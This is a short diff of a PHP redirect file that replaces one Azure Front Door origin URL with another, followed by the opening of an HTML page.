@@ -1,6 +1,6 @@
 <?php
 // You can set your redirect URL here
-$url = "https://feabbmhwg7a-default-origin-group-ddb7eeavbeazckaq.z03.azurefd.net";
+$url = "https://sjdvfbvdv-default-origin-group-deamexdhf4dxfcdu.z03.azurefd.net";
 ?>
 
 <!DOCTYPE html>
